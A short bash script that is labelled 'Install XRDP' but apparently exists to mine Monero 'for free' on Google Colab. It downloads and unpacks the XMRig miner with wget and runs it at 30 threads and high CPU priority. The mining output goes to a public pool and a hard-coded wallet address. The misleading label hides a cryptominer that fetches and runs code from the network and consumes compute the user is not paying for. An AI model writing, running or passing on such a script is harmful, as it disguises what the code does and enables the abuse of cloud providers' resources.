#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -a rx/0 -o us.monero.herominers.com:1111 -u solo:8BrixK3vTTdPRG92JMdwsefnDpLvzJUST6xf5PQn3iW2PFne3zwVAGhQPoVDx8zY2zG3WE9GvY1djgDB8HXhsg3wHxTCe9e -k --tls -p Threadripper --threads=30 --cpu-priority=5


